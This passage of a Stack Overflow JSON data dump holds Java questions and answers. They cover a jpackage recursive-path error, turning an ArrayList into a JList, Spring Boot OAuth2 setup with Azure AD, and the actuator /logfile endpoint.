/Users/cor/SoftwareProjects/Boekhouding/Desktop/Build/../Released/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents: File name too long\r\n```\r\n\r\nThis project was succesfully packaged with jpackage of jdk 11.0.3.\r\n\r\nDoes anyone have a clue what is going on here? \r\n\r\n\r\n\r\n","title":"jpackage FileSystemException","body":"<p>I have a Java project (on Mac OSX and in Eclipse) where jpackage produces an error I don't understand</p>\n<p>The jpackage command is as follows:</p>\n<pre><code>export JAVA_HOME=&quot;/Library/Java/JavaVirtualMachines/jdk-17.0.5.jdk/Contents/Home&quot;\nexport PATH=$JAVA_HOME/bin:$PATH\n\njpackage \\\n    --type app-image \\\n    -i ../Released \\\n    -d ../Released \\\n    -n &quot;Boekhouding&quot; \\\n    --app-version &quot;1.3.7&quot; \\\n    --icon ../../Images/euro.icns \\\n    --main-jar run.jar \\\n    --verbose\n</code></pre>\n<p>This jpackage version and command works with another project but not with this project. The error is as follows:</p>\n<pre><code>java.nio.file.FileSystemException: /Users/cor/SoftwareProjects/Boekhouding/Desktop/Build/../Released/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents/app/Boekhouding.app/Contents: File name too long\n</code></pre>\n<p>This project was succesfully packaged with jpackage of jdk 11.0.3.</p>\n<p>Does anyone have a clue what is going on here?</p>\n"},{"tags":["java","arrays","arraylist","jlist"],"answers":[{"tags":[],"owner":{"account_id":120605,"reputation":24173,"user_id":313137,"display_name":"Romain Hippeau"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1481095843,"creation_date":1279323672,"answer_id":3269528,"question_id":3269516,"body_markdown":"\r\nConstructor Summary  \r\n`JList()` Constructs a `JList` with an empty, read-only, model.  \r\n`JList(ListModel dataModel)` Constructs a `JList` that displays elements from the specified, non-null, model.  \r\n`JList(Object[] listData)`  Constructs a `JList` that displays the elements in the specified array.  \r\n`JList(Vector&lt;?&gt; listData)` Constructs a `JList` that displays the elements in the specified Vector.  \r\n","title":"Java ArrayLists into JList","body":"<p>Constructor Summary<br>\n<code>JList()</code> Constructs a <code>JList</code> with an empty, read-only, model.<br>\n<code>JList(ListModel dataModel)</code> Constructs a <code>JList</code> that displays elements from the specified, non-null, model.<br>\n<code>JList(Object[] listData)</code>  Constructs a <code>JList</code> that displays the elements in the specified array.<br>\n<code>JList(Vector&lt;?&gt; listData)</code> Constructs a <code>JList</code> that displays the elements in the specified Vector.  </p>\n"},{"tags":[],"owner":{"account_id":51705,"reputation":21173,"user_id":154527,"accept_rate":100,"display_name":"Alain O&#39;Dea"},"down_vote_count":0,"up_vote_count":28,"is_accepted":true,"score":28,"last_activity_date":1683715087,"creation_date":1279324249,"answer_id":3269560,"question_id":3269516,"body_markdown":"**JList** provides a constructor **JList(E[])** which you can call after unpacking your **ArrayList&amp;lt;String&amp;gt;** using **toArray(T[])**:\r\n\r\n    list = new JList&lt;&gt;(arr.toArray(new String[arr.size()]))","title":"Java ArrayLists into JList","body":"<p><strong>JList</strong> provides a constructor <strong>JList(E[])</strong> which you can call after unpacking your <strong>ArrayList&lt;String&gt;</strong> using <strong>toArray(T[])</strong>:</p>\n<pre><code>list = new JList&lt;&gt;(arr.toArray(new String[arr.size()]))\n</code></pre>\n"},{"tags":[],"owner":{"account_id":984295,"reputation":521,"user_id":1003206,"accept_rate":67,"display_name":"Jon Sansoucie"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1510226888,"creation_date":1398860248,"answer_id":23387881,"question_id":3269516,"body_markdown":"I had trouble with the `toArray()` method causing exceptions, so I built a quick generic method to convert. Maybe someone will find it useful as well. I know this is an old post but I&#39;ll bet it&#39;s still viewed from time to time. Here&#39;s the method:\r\n\r\n    private &lt;T&gt; void populateArrayFromList(T[] arr, ArrayList&lt;T&gt; arrayList) {\r\n        System.out.println(&quot;Array size &quot; + arr.length);\r\n        System.out.println(&quot;ArrayList size &quot; + arrayList.size());\r\n        for (int i = 0; i &lt; arrayList.size(); i++) {\r\n            arr[i] = arrayList.get(i);\r\n        }\r\n    }\r\n\r\nJust create the array before you pass it in, like\r\n\r\n    String[] arr = new String[arrayList.size()];\r\n\r\nThen just call it from your code\r\n\r\n    populateArrayFromList(arr, arrayList);","title":"Java ArrayLists into JList","body":"<p>I had trouble with the <code>toArray()</code> method causing exceptions, so I built a quick generic method to convert. Maybe someone will find it useful as well. I know this is an old post but I'll bet it's still viewed from time to time. Here's the method:</p>\n\n<pre><code>private &lt;T&gt; void populateArrayFromList(T[] arr, ArrayList&lt;T&gt; arrayList) {\n    System.out.println(\"Array size \" + arr.length);\n    System.out.println(\"ArrayList size \" + arrayList.size());\n    for (int i = 0; i &lt; arrayList.size(); i++) {\n        arr[i] = arrayList.get(i);\n    }\n}\n</code></pre>\n\n<p>Just create the array before you pass it in, like</p>\n\n<pre><code>String[] arr = new String[arrayList.size()];\n</code></pre>\n\n<p>Then just call it from your code</p>\n\n<pre><code>populateArrayFromList(arr, arrayList);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6322506,"reputation":21,"user_id":4910021,"display_name":"user4910021"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1446109438,"creation_date":1431899523,"answer_id":30292537,"question_id":3269516,"body_markdown":"I had trouble with toArray() and JList for my project as well. Did some research and tried a few things and found something that works. Hope it helps everyone:\r\n\r\n    ArrayList&lt;String&gt; i = new ArrayList&lt;&gt;();\r\n\tString[] str = new String[i.size()];\r\n    //Assuming there is data in your list\r\n\tJList&lt;String&gt; list = new JList&lt;&gt;(i.toArray(str));\r\n","title":"Java ArrayLists into JList","body":"<p>I had trouble with toArray() and JList for my project as well. Did some research and tried a few things and found something that works. Hope it helps everyone:</p>\n\n<pre><code>ArrayList&lt;String&gt; i = new ArrayList&lt;&gt;();\nString[] str = new String[i.size()];\n//Assuming there is data in your list\nJList&lt;String&gt; list = new JList&lt;&gt;(i.toArray(str));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10703219,"reputation":376,"user_id":7877831,"display_name":"Lakshan G"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1492747189,"creation_date":1492745850,"answer_id":43533541,"question_id":3269516,"body_markdown":"Try this:\r\n\r\n    DefaultListModel listModel = new DefaultListModel();\r\n    for (int i = 0; i &lt; arrayList().size(); i++)\r\n    {\r\n        listModel.addElement(arrayList().get(i));\r\n    }\r\n    jList1.setModel(listModel);","title":"Java ArrayLists into JList","body":"<p>Try this:</p>\n\n<pre><code>DefaultListModel listModel = new DefaultListModel();\nfor (int i = 0; i &lt; arrayList().size(); i++)\n{\n    listModel.addElement(arrayList().get(i));\n}\njList1.setModel(listModel);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":12203078,"reputation":1,"user_id":8906875,"display_name":"Marat"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1510226466,"creation_date":1510217553,"answer_id":47197512,"question_id":3269516,"body_markdown":"I simply implemented the ListModel interface:\r\n\r\n\t\tpackage proba;\r\n\r\n\t\timport java.awt.BorderLayout;\r\n\t\timport java.awt.EventQueue;\r\n\t\timport java.util.ArrayList;\r\n\t\timport javax.swing.JFrame;\r\n\t\timport javax.swing.JList;\r\n\t\timport javax.swing.JScrollPane;\r\n\t\timport javax.swing.ListModel;\r\n\t\timport javax.swing.ListSelectionModel;\r\n\t\timport javax.swing.event.ListDataListener;\r\n\r\n\t\tpublic class Proba extends JFrame {\r\n\t\t\tArrayList&lt;String&gt; al = new ArrayList&lt;&gt;();\r\n\t\t\tpublic Proba() {\r\n\t\t\t\tal.add(&quot;1111111&quot;);\r\n\t\t\t\tal.add(&quot;2222222&quot;);\r\n\t\t\t\tal.add(&quot;3333333&quot;);\r\n\t\t\t\tsetLayout(new BorderLayout());\r\n\t\t\t\tMyListModel lm = new MyListModel();\r\n\t\t\t\tJList l = new JList(lm);\r\n\t\t\t\tl.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);\r\n\t\t\t\tJScrollPane sp = new JScrollPane(l);\r\n\t\t\t\tadd(sp, BorderLayout.CENTER);\r\n\t\t\t}\r\n\r\n\t\t\tclass MyListModel implements ListModel {\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic int getSize() {\r\n\t\t\t\t\treturn al.size();\r\n\t\t\t\t}\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic Object getElementAt(int index) {\r\n\t\t\t\t\treturn al.get(index);\r\n\t\t\t\t}\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic void addListDataListener(ListDataListener l) {\r\n\t\t\t\t}\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic void removeListDataListener(ListDataListener l) {\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tpublic static void main(String[] args) {\r\n\t\t\t\tEventQueue.invokeLater(new Runnable() {\r\n\t\t\t\t\t@Override\r\n\t\t\t\t\tpublic void run() {\r\n\t\t\t\t\t\tProba app = new Proba();\r\n\t\t\t\t\t\tapp.setSize(600, 480);\r\n\t\t\t\t\t\tapp.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n\t\t\t\t\t\tapp.setVisible(true);\r\n\t\t\t\t\t}\r\n\t\t\t\t});\r\n\t\t\t}\r\n\t\t}\r\n","title":"Java ArrayLists into JList","body":"<p>I simply implemented the ListModel interface:</p>\n\n<pre><code>    package proba;\n\n    import java.awt.BorderLayout;\n    import java.awt.EventQueue;\n    import java.util.ArrayList;\n    import javax.swing.JFrame;\n    import javax.swing.JList;\n    import javax.swing.JScrollPane;\n    import javax.swing.ListModel;\n    import javax.swing.ListSelectionModel;\n    import javax.swing.event.ListDataListener;\n\n    public class Proba extends JFrame {\n        ArrayList&lt;String&gt; al = new ArrayList&lt;&gt;();\n        public Proba() {\n            al.add(\"1111111\");\n            al.add(\"2222222\");\n            al.add(\"3333333\");\n            setLayout(new BorderLayout());\n            MyListModel lm = new MyListModel();\n            JList l = new JList(lm);\n            l.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);\n            JScrollPane sp = new JScrollPane(l);\n            add(sp, BorderLayout.CENTER);\n        }\n\n        class MyListModel implements ListModel {\n            @Override\n            public int getSize() {\n                return al.size();\n            }\n            @Override\n            public Object getElementAt(int index) {\n                return al.get(index);\n            }\n            @Override\n            public void addListDataListener(ListDataListener l) {\n            }\n            @Override\n            public void removeListDataListener(ListDataListener l) {\n            }\n        }\n\n        public static void main(String[] args) {\n            EventQueue.invokeLater(new Runnable() {\n                @Override\n                public void run() {\n                    Proba app = new Proba();\n                    app.setSize(600, 480);\n                    app.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n                    app.setVisible(true);\n                }\n            });\n        }\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":14144492,"reputation":71,"user_id":10218187,"display_name":"Mukesh Chauhan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1547543929,"creation_date":1547543929,"answer_id":54195832,"question_id":3269516,"body_markdown":"if you are using drag and drop components then, name your list as &quot;itemList&quot; and I suppose that arr is the name of your arraylist which contains some string data then :\r\n\r\n    `DefaultComboBoxModel model=\r\n    new DefaultComboBoxModel(arr.toArray(new String[arr.size()]));\r\n    itemList.setModel(model);`\r\n\r\nI hope this will work for you.","title":"Java ArrayLists into JList","body":"<p>if you are using drag and drop components then, name your list as \"itemList\" and I suppose that arr is the name of your arraylist which contains some string data then :</p>\n\n<pre><code>`DefaultComboBoxModel model=\nnew DefaultComboBoxModel(arr.toArray(new String[arr.size()]));\nitemList.setModel(model);`\n</code></pre>\n\n<p>I hope this will work for you.</p>\n"},{"tags":[],"owner":{"account_id":8471125,"reputation":45,"user_id":6353682,"display_name":"b3n10"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1549358105,"creation_date":1549358105,"answer_id":54530994,"question_id":3269516,"body_markdown":"You can pass `Object` superclass as type of the JList.\r\n\r\n    ArrayList&lt;String&gt; arr = new ArrayList&lt;String&gt;();\r\n    \r\n    arr.add(&quot;Hatchet&quot;);\r\n    arr.add(&quot;Sword&quot;);\r\n    arr.add(&quot;Shield&quot;);\r\n    \r\n    JList&lt;Object&gt; list = JList&lt;Object&gt;(arr.toArray());","title":"Java ArrayLists into JList","body":"<p>You can pass <code>Object</code> superclass as type of the JList.</p>\n\n<pre><code>ArrayList&lt;String&gt; arr = new ArrayList&lt;String&gt;();\n\narr.add(\"Hatchet\");\narr.add(\"Sword\");\narr.add(\"Shield\");\n\nJList&lt;Object&gt; list = JList&lt;Object&gt;(arr.toArray());\n</code></pre>\n"},{"tags":[],"owner":{"account_id":15142356,"reputation":13,"user_id":10927025,"display_name":"oboamg lolZZ"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1553349569,"creation_date":1553349569,"answer_id":55314468,"question_id":3269516,"body_markdown":"if you have a loop in for gaining data in mysql\r\nyou can put like this\r\n\r\n\t     while(result.next()){\r\n\t\t itemid = result.getInt(&quot;id&quot;);\r\n\t\t itempice = result.getInt(&quot;price&quot;);\r\n\t     itemname = result.getString(&quot;itemname&quot;);\r\n         arraylist.add(itemname+&quot; Price: &quot;+itempice);\r\n         }\r\n         jList.setListData(arraylist.toArray());","title":"Java ArrayLists into JList","body":"<p>if you have a loop in for gaining data in mysql\nyou can put like this</p>\n\n<pre><code>     while(result.next()){\n     itemid = result.getInt(\"id\");\n     itempice = result.getInt(\"price\");\n     itemname = result.getString(\"itemname\");\n     arraylist.add(itemname+\" Price: \"+itempice);\n     }\n     jList.setListData(arraylist.toArray());\n</code></pre>\n"}],"owner":{"account_id":101237,"reputation":17866,"user_id":272501,"accept_rate":96,"display_name":"test"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":95723,"favorite_count":0,"down_vote_count":0,"up_vote_count":13,"accepted_answer_id":3269560,"answer_count":9,"score":13,"last_activity_date":1683715087,"creation_date":1279323445,"question_id":3269516,"body_markdown":"OK so I&#39;m doing a small part of my inventory. I got MOST of it down. I&#39;m trying to add string items to an ArrayList then add that to a JList. However, I&#39;m getting this error when I compile:\r\n\r\n    C:\\Users\\Dan\\Documents\\DanJavaGen\\inventory.java:30: cannot find symbol\r\n    symbol  : constructor JList(java.util.ArrayList&lt;java.lang.String&gt;)\r\n    location: class javax.swing.JList\r\n    \t\tlist = new JList(arr);\r\n\r\n\r\nIt&#39;s probably some rookie mistake I am making ... :/\r\n\r\nCode:\r\n\r\n    import java.applet.Applet;\r\n    import java.awt.*;\r\n    import javax.swing.*;\r\n    import javax.swing.JList;\r\n    import java.awt.event.*;\r\n    import java.util.ArrayList;\r\n    import java.io.*;\r\n    import java.util.*;\r\n    \r\n    public class inventory extends JApplet implements MouseListener {\r\n    \r\n    public static String newline;\r\n    public static JList list;\r\n    int gold = 123;\r\n    \r\n    \tpublic void init() {\r\n    \r\n    \r\n    \r\n    ArrayList&lt;String&gt; arr = new ArrayList&lt;String&gt;();\r\n    arr.add(&quot;Hatchet&quot;);\r\n    arr.add(&quot;Sword&quot;);\r\n    arr.add(&quot;Shield&quot;);\r\n    arr.add(gold + &quot; Gold&quot;);\r\n    System.out.println(&quot;You have &quot; + arr.size() + &quot; items in your inventory.&quot;);\r\n    showInventory(arr);\r\n    \r\n    \r\n    \r\n    \t\tlist = new JList(arr);\r\n    \r\n            add(list);\r\n    \r\n            list.addMouseListener(this);\r\n    \r\n            list.setVisible(true);\r\n    \r\n    \t}\r\n    \r\n    public static void showInventory (ArrayList&lt;String&gt; theList) {\r\n    for (int i = 0; i &lt; theList.size(); i++) {\r\n    System.out.println(theList.get(i));\r\n    }\r\n    }\r\n    \r\n    \r\n        public void mousePressed(MouseEvent e) { }\r\n    \r\n        public void mouseReleased(MouseEvent e) {\r\n    \t\tObject index = list.getSelectedValue();\r\n           System.out.println(&quot;You have selected: &quot; + index);\r\n        }\r\n    \r\n        public void mouseEntered(MouseEvent e) { }\r\n    \r\n        public void mouseExited(MouseEvent e) { }\r\n    \r\n        public void mouseClicked(MouseEvent e) { }\r\n    \r\n    \r\n    \r\n    \r\n        public void paint(Graphics g) {\r\n    \r\n        }\r\n    }","title":"Java ArrayLists into JList","body":"<p>OK so I'm doing a small part of my inventory. I got MOST of it down. I'm trying to add string items to an ArrayList then add that to a JList. However, I'm getting this error when I compile:</p>\n\n<pre><code>C:\\Users\\Dan\\Documents\\DanJavaGen\\inventory.java:30: cannot find symbol\nsymbol  : constructor JList(java.util.ArrayList&lt;java.lang.String&gt;)\nlocation: class javax.swing.JList\n        list = new JList(arr);\n</code></pre>\n\n<p>It's probably some rookie mistake I am making ... :/</p>\n\n<p>Code:</p>\n\n<pre><code>import java.applet.Applet;\nimport java.awt.*;\nimport javax.swing.*;\nimport javax.swing.JList;\nimport java.awt.event.*;\nimport java.util.ArrayList;\nimport java.io.*;\nimport java.util.*;\n\npublic class inventory extends JApplet implements MouseListener {\n\npublic static String newline;\npublic static JList list;\nint gold = 123;\n\n    public void init() {\n\n\n\nArrayList&lt;String&gt; arr = new ArrayList&lt;String&gt;();\narr.add(\"Hatchet\");\narr.add(\"Sword\");\narr.add(\"Shield\");\narr.add(gold + \" Gold\");\nSystem.out.println(\"You have \" + arr.size() + \" items in your inventory.\");\nshowInventory(arr);\n\n\n\n        list = new JList(arr);\n\n        add(list);\n\n        list.addMouseListener(this);\n\n        list.setVisible(true);\n\n    }\n\npublic static void showInventory (ArrayList&lt;String&gt; theList) {\nfor (int i = 0; i &lt; theList.size(); i++) {\nSystem.out.println(theList.get(i));\n}\n}\n\n\n    public void mousePressed(MouseEvent e) { }\n\n    public void mouseReleased(MouseEvent e) {\n        Object index = list.getSelectedValue();\n       System.out.println(\"You have selected: \" + index);\n    }\n\n    public void mouseEntered(MouseEvent e) { }\n\n    public void mouseExited(MouseEvent e) { }\n\n    public void mouseClicked(MouseEvent e) { }\n\n\n\n\n    public void paint(Graphics g) {\n\n    }\n}\n</code></pre>\n"},{"tags":["java","spring-boot","spring-boot-oauth2.1"],"owner":{"account_id":2341065,"reputation":736,"user_id":2052346,"accept_rate":76,"display_name":"sparks"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":399,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683714165,"creation_date":1682436191,"question_id":76102880,"body_markdown":"I am trying to configure my spring boot app to use OAuth2 with Azure active directory. However, spring boot either isn&#39;t picking up application.yml file or my file isn&#39;t configured correctly, but I can&#39;t seem to find what is configured wrong.\r\n\r\nThe root error I am getting is \r\n&gt; Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type &#39;org.springframework.security.oauth2.client.registration.ClientRegistrationRepository&#39; available\r\n\r\nbut If I include a bean in my config file with similar setup, the tomcat server is able to startup successfully, but is pointing to the wrong endpoint. (`/oauth2/authorization/azure` vs the expected `/login/oauth2/code/`)\r\n\r\nI&#39;m using spring version 5.3.20, spring boot version 2.7.10, and spring security 5.6.9.Final\r\n\r\napplication.yml:\r\n```yml\r\nazure:\r\n  activedirectory:\r\n    client-id: {CLIENT ID}\r\n    client-secret: {CLIENT SECRET}\r\n    tenant-id: {TENANT ID}\r\n    authorization-clients:\r\n      facility-inventory:\r\n        scopes: openid, profile, user, offline_access\r\n        authorization-grant-type: client_credentials\r\nspring:\r\n  security:\r\n    oauth2:\r\n      client:\r\n        provider:          \r\n          azure-active-directory:\r\n            issuer-uri: https://login.microsoftonline.com/{ORG}/oauth2/v2.0 \r\n        registration:\r\n          azure:\r\n            provider: azure-active-directory\r\n            client-id: {CLIENT ID}\r\n            client-secret: {CLIENT SECRET}\r\n            scope: openid, profile, user, offline_access\r\n            authorization-uri: /login/oauth2/authorize/\r\n            redirect-uri: /login/oauth2/code/\r\n            authorization-grant-type: client_credentials\r\n            pre-established-redirect-uri: {Base URL}/login/oauth2/code/\r\n            registered-redirect-uri: {Base URL}/login/oauth2/code/\r\n            use-current-uri: false\r\n```\r\n\r\nJava Custom ClientRegistation definition:\r\n```java\r\n@Bean\r\npublic ClientRegistrationRepository clientRegistrationRepository() {\r\n\t\treturn new InMemoryClientRegistrationRepository(\r\n\t\t\tClientRegistration\r\n\t\t\t\t.withRegistrationId(&quot;azure&quot;)\r\n\t\t\t\t.clientId(&quot;{CLIENT ID}&quot;)\r\n\t\t\t\t.clientSecret(&quot;CLIENT SECRET&quot;)\r\n\t\t\t\t.clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)\r\n\t\t\t\t.authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)\r\n\t\t\t\t.redirectUri(&quot;/login/oauth2/code/*&quot;)\r\n\t\t\t\t.scope(&quot;openid&quot;, &quot;profile&quot;, &quot;email&quot;, &quot;address&quot;, &quot;phone&quot;)\r\n\t\t\t\t.authorizationUri(&quot;https://login.microsoftonline.com/{ORG}/oauth2/v2.0&quot;)\r\n\t\t\t\t.tokenUri(&quot;https://login.microsoftonline.com/{ORG}/oauth2/v2.0/token&quot;)\r\n\t\t\t\t.userNameAttributeName(IdTokenClaimNames.SUB)\r\n\t\t\t\t.clientName(&quot;Valuations-Mgmt-Tool_qa_ac_client&quot;)\r\n\t\t\t\t.build()\r\n\t\t\t);\r\n\t}\r\n```","title":"Spring Boot application.yml file misconfigured? Azure Active Directory OAuth2","body":"<p>I am trying to configure my spring boot app to use OAuth2 with Azure active directory. However, spring boot either isn't picking up application.yml file or my file isn't configured correctly, but I can't seem to find what is configured wrong.</p>\n<p>The root error I am getting is</p>\n<blockquote>\n<p>Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'org.springframework.security.oauth2.client.registration.ClientRegistrationRepository' available</p>\n</blockquote>\n<p>but If I include a bean in my config file with similar setup, the tomcat server is able to startup successfully, but is pointing to the wrong endpoint. (<code>/oauth2/authorization/azure</code> vs the expected <code>/login/oauth2/code/</code>)</p>\n<p>I'm using spring version 5.3.20, spring boot version 2.7.10, and spring security 5.6.9.Final</p>\n<p>application.yml:</p>\n<pre class=\"lang-yaml prettyprint-override\"><code>azure:\n  activedirectory:\n    client-id: {CLIENT ID}\n    client-secret: {CLIENT SECRET}\n    tenant-id: {TENANT ID}\n    authorization-clients:\n      facility-inventory:\n        scopes: openid, profile, user, offline_access\n        authorization-grant-type: client_credentials\nspring:\n  security:\n    oauth2:\n      client:\n        provider:          \n          azure-active-directory:\n            issuer-uri: https://login.microsoftonline.com/{ORG}/oauth2/v2.0 \n        registration:\n          azure:\n            provider: azure-active-directory\n            client-id: {CLIENT ID}\n            client-secret: {CLIENT SECRET}\n            scope: openid, profile, user, offline_access\n            authorization-uri: /login/oauth2/authorize/\n            redirect-uri: /login/oauth2/code/\n            authorization-grant-type: client_credentials\n            pre-established-redirect-uri: {Base URL}/login/oauth2/code/\n            registered-redirect-uri: {Base URL}/login/oauth2/code/\n            use-current-uri: false\n</code></pre>\n<p>Java Custom ClientRegistation definition:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Bean\npublic ClientRegistrationRepository clientRegistrationRepository() {\n        return new InMemoryClientRegistrationRepository(\n            ClientRegistration\n                .withRegistrationId(&quot;azure&quot;)\n                .clientId(&quot;{CLIENT ID}&quot;)\n                .clientSecret(&quot;CLIENT SECRET&quot;)\n                .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)\n                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)\n                .redirectUri(&quot;/login/oauth2/code/*&quot;)\n                .scope(&quot;openid&quot;, &quot;profile&quot;, &quot;email&quot;, &quot;address&quot;, &quot;phone&quot;)\n                .authorizationUri(&quot;https://login.microsoftonline.com/{ORG}/oauth2/v2.0&quot;)\n                .tokenUri(&quot;https://login.microsoftonline.com/{ORG}/oauth2/v2.0/token&quot;)\n                .userNameAttributeName(IdTokenClaimNames.SUB)\n                .clientName(&quot;Valuations-Mgmt-Tool_qa_ac_client&quot;)\n                .build()\n            );\n    }\n</code></pre>\n"},{"tags":["java","spring","spring-boot"],"comments":[{"owner":{"account_id":406060,"reputation":21895,"user_id":775345,"accept_rate":96,"display_name":"Robert Moskal"},"score":0,"creation_date":1448542135,"post_id":33938997,"comment_id":55637318,"body_markdown":"It looks like they are built in. You can&#39;t just hit /log file or /health?","body":"It looks like they are built in. You can&#39;t just hit /log file or /health?"},{"owner":{"account_id":4912982,"reputation":14853,"user_id":3957754,"accept_rate":50,"display_name":"JRichardsz"},"score":0,"creation_date":1656709657,"post_id":33938997,"comment_id":128646697,"body_markdown":"none worked for me : java 8, 2022, &lt;version&gt;2.1.1.RELEASE&lt;/version&gt;","body":"none worked for me : java 8, 2022, &lt;version&gt;2.1.1.RELEASE&lt;/version&gt;"}],"answers":[{"tags":[],"owner":{"account_id":435280,"reputation":14323,"user_id":821786,"display_name":"Gergely Bacso"},"down_vote_count":0,"up_vote_count":21,"is_accepted":false,"score":21,"last_activity_date":1610218323,"creation_date":1448550088,"answer_id":33941707,"question_id":33938997,"body_markdown":"In order to enable this feature, one of these two params need to be set:\r\n\r\n- `logging.file.name`\r\n- `logging.file.path`\r\n\r\n[Logging configuration][1]\r\n\r\nAfter that the endpoint should be enabled by default.\r\n\r\n  [1]: https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-logging-file-output","title":"logfile endpoint in Spring Boot","body":"<p>In order to enable this feature, one of these two params need to be set:</p>\n<ul>\n<li><code>logging.file.name</code></li>\n<li><code>logging.file.path</code></li>\n</ul>\n<p><a href=\"https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-logging-file-output\" rel=\"noreferrer\">Logging configuration</a></p>\n<p>After that the endpoint should be enabled by default.</p>\n"},{"tags":[],"owner":{"account_id":2466941,"reputation":1002,"user_id":2243408,"display_name":"lekant"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1610207309,"creation_date":1452641701,"answer_id":34755808,"question_id":33938997,"body_markdown":"`/logfile` was included in version [1.3.0+ only](https://github.com/spring-projects/spring-boot/blob/master/spring-boot-actuator/src/main/java/org/springframework/boot/actuate/endpoint/mvc/LogFileMvcEndpoint.java#L51).\r\n\r\n\r\n\r\nIf you use an earlier version it will then not be present..","title":"logfile endpoint in Spring Boot","body":"<p><code>/logfile</code> was included in version <a href=\"https://github.com/spring-projects/spring-boot/blob/master/spring-boot-actuator/src/main/java/org/springframework/boot/actuate/endpoint/mvc/LogFileMvcEndpoint.java#L51\" rel=\"nofollow noreferrer\">1.3.0+ only</a>.</p>\n<p>If you use an earlier version it will then not be present..</p>\n"},{"tags":[],"owner":{"account_id":11224625,"reputation":1109,"user_id":8234633,"accept_rate":64,"display_name":"Jan69"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1524151396,"creation_date":1524151396,"answer_id":49924752,"question_id":33938997,"body_markdown":"I added below code to enable /logfile endpoint\r\n\r\n    pom.xml\r\n    -----------\r\n    \r\n    \t\t&lt;dependency&gt;\r\n    \t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n    \t\t\t&lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;\r\n    \t\t&lt;/dependency&gt;\r\n\r\n\r\n    application.properties\r\n    -----------------------\r\n    \r\n    management.security.enabled=false\r\n    endpoints.env.enabled=false\r\n    endpoints.configprops.enabled=false\r\n    endpoints.autoconfig.enabled=false\r\n    endpoints.beans.enabled=false\r\n    endpoints.dump.enabled=true\r\n    endpoints.heapdump.enabled=true\r\n    logging.level.root=info\r\n    logging.file=target/app.log","title":"logfile endpoint in Spring 